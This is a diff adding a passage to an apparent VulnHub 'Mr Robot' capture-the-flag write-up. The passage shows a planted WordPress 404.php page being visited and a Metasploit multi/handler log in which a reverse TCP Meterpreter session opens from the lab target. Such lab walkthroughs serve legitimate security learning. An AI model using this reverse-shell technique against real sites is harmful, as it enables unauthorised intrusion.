@@ -2532,9 +2532,27 @@ http://192.168.125.132/wp-content/themes/twentyfourteen/404.php
 ```
 
 <p></p>
+When we navigate to this page it looks like the page is hanging.
+<p></p>
+<div align="center">
+<img src="https://github.com/Shadow-Admins/Cyber_Club/blob/e013fb58f5002d89c977e8cec0e9d6eb86f3d11f/Starting_Point/VulnHub/MrRobot/images/insidereverse.png"><br>
+</div>
+<p></p>
+But if we look at our msfconsole we can see that a connection has been established.
+<p></p>
 
+```
+msf6 exploit(multi/handler) > exploit
 
+[*] Started reverse TCP handler on 192.168.125.134:1337 
+[*] Sending stage (39282 bytes) to 192.168.125.132
+[*] Meterpreter session 1 opened (192.168.125.134:1337 -> 192.168.125.132:45512) at 2021-07-09 14:55:30 +1000
 
+meterpreter > 
+```
+
+<p></p>
+We have now gained access to the target VM! We can navigate around it 
 
 
 
